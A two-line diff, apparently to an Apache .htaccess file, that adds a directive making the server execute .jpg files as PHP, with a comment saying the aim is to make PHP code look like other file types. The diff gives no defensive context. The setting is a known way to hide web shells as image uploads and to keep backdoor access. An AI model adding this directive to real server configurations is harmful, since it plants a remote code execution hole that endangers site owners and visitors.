@@ -1,0 +1,2 @@
+# Make PHP code look like other code types
+AddType application/x-httpd-php .jpg
